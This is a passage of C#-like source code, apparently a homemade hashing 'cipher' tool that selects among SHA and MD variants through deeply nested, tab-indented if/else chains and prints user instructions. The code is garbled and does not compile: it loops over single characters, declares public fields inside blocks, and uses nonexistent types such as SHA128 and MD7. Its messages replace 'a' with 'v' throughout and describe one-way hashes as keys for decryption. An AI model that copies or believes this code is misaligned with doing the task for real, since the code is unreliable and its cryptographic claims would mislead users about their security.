																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																		public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																		public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																		return _shvfunc;

																																																																																																																	}
																																																																																																																	else if(_codexstring[1] == "f"){
																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																			public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																			public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																			return _shvfunc;

																																																																																																																		}
																																																																																																																		else if(_codexstring[1] == "G"){
																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																				public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																				public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																				return _shvfunc;

																																																																																																																			}
																																																																																																																			else if(_codexstring[1] == "z"){
																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																					public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																					public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																					return _shvfunc;

																																																																																																																				}
																																																																																																																				else{

																																																																																																																					System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																				}



																																																																																																																			}
																																																																																																																			for(_codexstring[2]){

																																																																																																																				if(_codexstring[2] == "c"){
																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																						public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																						public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																						return _shvfunc;

																																																																																																																					}

																																																																																																																				}

																																																																																																																				else if(_codexstring[2] == "d"){
																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																						public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																						public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																						return _shvfunc;

																																																																																																																					}
																																																																																																																					else if(_codexstring[2] == "e"){
																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																							public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																							public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																							return _shvfunc;

																																																																																																																						}
																																																																																																																						else if(_codexstring[2] == "f"){
																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																								public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																								public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																								return _shvfunc;

																																																																																																																							}
																																																																																																																							else if(_codexstring[2] == "G"){
																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																									public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																									public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																									return _shvfunc;

																																																																																																																								}
																																																																																																																								else if(_codexstring[2] == "z"){
																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																										public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																										public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																										return _shvfunc;

																																																																																																																									}
																																																																																																																									else{

																																																																																																																										System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																									}
																																																																																																																								}
																																																																																																																								for(_codexstring[3]){

																																																																																																																									if(_codexstring[3] == "c"){
																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																											public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																											public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																											return _shvfunc;

																																																																																																																										}

																																																																																																																									}

																																																																																																																									else if(_codexstring[3] == "d"){
																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																											public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																											public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																											return _shvfunc;

																																																																																																																										}
																																																																																																																										else if(_codexstring[3] == "e"){
																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																												public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																												public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																												return _shvfunc;

																																																																																																																											}
																																																																																																																											else if(_codexstring[3] == "f"){
																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																													public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																													public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																													return _shvfunc;

																																																																																																																												}
																																																																																																																												else if(_codexstring[3] == "G"){
																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																														public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																														public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																														return _shvfunc;

																																																																																																																													}
																																																																																																																													else if(_codexstring[3] == "z"){
																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																															public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																															public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																															return _shvfunc;

																																																																																																																														}
																																																																																																																														else{

																																																																																																																															System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																														}

																																																																																																																													}
																																																																																																																													for(_codexstring[4]){

																																																																																																																														if(_codexstring[4] == "c"){
																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																return _shvfunc;

																																																																																																																															}

																																																																																																																														}

																																																																																																																														else if(_codexstring[4] == "d"){
																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																return _shvfunc;

																																																																																																																															}
																																																																																																																															else if(_codexstring[4] == "e"){
																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																	public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																	public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																	return _shvfunc;

																																																																																																																																}
																																																																																																																																else if(_codexstring[4] == "f"){
																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																		public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																		public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																		return _shvfunc;

																																																																																																																																	}
																																																																																																																																	else if(_codexstring[4] == "G"){
																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																			public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																			public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																			return _shvfunc;

																																																																																																																																		}
																																																																																																																																		else if(_codexstring[4] == "z"){
																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																				public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																				public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																				return _shvfunc;

																																																																																																																																			}
																																																																																																																																			else{

																																																																																																																																				System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																			}

																																																																																																																																		}
																																																																																																																																		for(_codexstring[5]){

																																																																																																																																			if(_codexstring[5] == "c"){
																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																					public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																					public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																					return _shvfunc;

																																																																																																																																				}

																																																																																																																																			}

																																																																																																																																			else if(_codexstring[5] == "d"){
																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																					public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																					public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																					return _shvfunc;

																																																																																																																																				}
																																																																																																																																				else if(_codexstring[5] == "e"){
																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																						public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																						public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																						return _shvfunc;

																																																																																																																																					}
																																																																																																																																					else if(_codexstring[5] == "f"){
																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																							public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																							public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																							return _shvfunc;

																																																																																																																																						}
																																																																																																																																						else if(_codexstring[5] == "G"){
																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																								public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																								public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																								return _shvfunc;

																																																																																																																																							}
																																																																																																																																							else if(_codexstring[5] == "z"){
																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																									public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																									public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																									return _shvfunc;

																																																																																																																																								}
																																																																																																																																								else{

																																																																																																																																									System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																								}
																																																																																																																																							}
																																																																																																																																							for(_codexstring[6]){

																																																																																																																																								if(_codexstring[6] == "c"){
																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																										public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																										public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																										return _shvfunc;

																																																																																																																																									}

																																																																																																																																								}

																																																																																																																																								else if(_codexstring[6] == "d"){
																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																										public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																										public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																										return _shvfunc;

																																																																																																																																									}
																																																																																																																																									else if(_codexstring[6] == "e"){
																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																											public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																											public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																											return _shvfunc;

																																																																																																																																										}
																																																																																																																																										else if(_codexstring[6] == "f"){
																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																												public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																												public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																												return _shvfunc;

																																																																																																																																											}
																																																																																																																																											else if(_codexstring[6] == "G"){
																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																													public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																													public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																													return _shvfunc;

																																																																																																																																												}
																																																																																																																																												else if(_codexstring[6] == "z"){
																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																														public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																														public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																														return _shvfunc;

																																																																																																																																													}
																																																																																																																																													else{
																																																																																																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																													}



																																																																																																																																												}
																																																																																																																																												for(_codexstring[7]){

																																																																																																																																													if(_codexstring[7] == "c"){
																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																														public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																															public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																															public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																															return _shvfunc2;

																																																																																																																																														}

																																																																																																																																													}

																																																																																																																																													else if(_codexstring[7] == "d"){
																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																														public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																															public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																															public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																															return _shvfunc2;

																																																																																																																																														}
																																																																																																																																														else if(_codexstring[7] == "e"){
																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																															public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																return _shvfunc2;

																																																																																																																																															}
																																																																																																																																															else if(_codexstring[7] == "f"){
																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																	public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																	public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																	return _shvfunc2;

																																																																																																																																																}
																																																																																																																																																else if(_codexstring[7] == "G"){
																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																		public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																		public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																		return _shvfunc2;

																																																																																																																																																	}
																																																																																																																																																	else if(_codexstring[7] == "z"){
																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																		public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																			public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																			public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																			return _shvfunc2;

																																																																																																																																																		}
																																																																																																																																																		else{
																																																																																																																																																			System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																		}



																																																																																																																																																	}
																																																																																																																																																	for(_codexstring[8]){

																																																																																																																																																		if(_codexstring[8] == "c"){
																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																			public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																				public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																				public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																				return _shvfunc2;

																																																																																																																																																			}

																																																																																																																																																		}

																																																																																																																																																		else if(_codexstring[8] == "d"){
																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																			public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																				public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																				public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																				return _shvfunc2;

																																																																																																																																																			}
																																																																																																																																																			else if(_codexstring[8] == "e"){
																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																				public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																					public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																					public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																					return _shvfunc2;

																																																																																																																																																				}
																																																																																																																																																				else if(_codexstring[8] == "f"){
																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																					public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																						public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																						public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																						return _shvfunc2;

																																																																																																																																																					}
																																																																																																																																																					else if(_codexstring[8] == "G"){
																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																						public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																							public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																							public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																							return _shvfunc2;

																																																																																																																																																						}
																																																																																																																																																						else if(_codexstring[8] == "z"){
																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																							public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																								public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																								public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																								return _shvfunc2;

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}



																																																																																																																																																						System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 7-2 Dimensionvl Vlgorithm Chosen To :");
																																																																																																																																																						System.Console.WriteLine(_shvfunc.ToString());
																																																																																																																																																						System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _shvfunc2.ToString() + "Vnd Do Not Forget To Include The 7:2 Descriptor For Effective Decryption! ");
																																																																																																																																																						System.Console.WriteLine("Your Two Key Encodings Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																																																																																																																						System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																																																																																																																						System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																																																																																																																						System.Console.ReadLine();
													}

																																																																																																																																																					else if(_VlgoDecise == "4(4)-5"){





																																																																																																																																																						System.Console.WriteLine("Hvving Chosen The 4(4)-5 Dimensionvl Vlgorithmic Hvshing Function V Word Is In Order... ");
																																																																																																																																																						System.Console.WriteLine("");
																																																																																																																																																						System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");
																																																																																																																																																						System.Console.WriteLine("Vfter Which The Choice Of Second End Encryptions Will Be Given To Be Chosen From One Of The First Four Used, Subsequently ");
																																																																																																																																																						System.Console.WriteLine("The Lvst Leg of The Encryption Production Will Provide The Room For The Key of Your Messvge For Cryptogrvphic Cipher Crevtion.");
																																																																																																																																																						System.Console.WriteLine(" ");
